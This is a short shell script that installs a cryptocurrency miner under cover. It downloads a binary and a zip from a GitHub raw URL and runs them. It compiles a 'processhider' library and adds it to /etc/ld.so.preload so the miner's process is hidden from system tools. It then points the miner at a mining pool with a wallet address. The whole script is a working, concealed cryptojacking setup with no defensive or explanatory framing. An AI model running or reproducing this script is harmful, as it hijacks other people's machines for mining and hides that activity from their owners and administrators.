#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install unzip iftop cmake binutils build-essential screen net-tools curl nano cpuid neofetch automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/avx512
chmod +x avx512

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicAVX512.zip

unzip magicAVX512.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./avx512 -a gr -o stratum+tcps://stratum-na.rplant.xyz:17056 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAzAz8 -p webpassword=IhatePopUps --no-tune
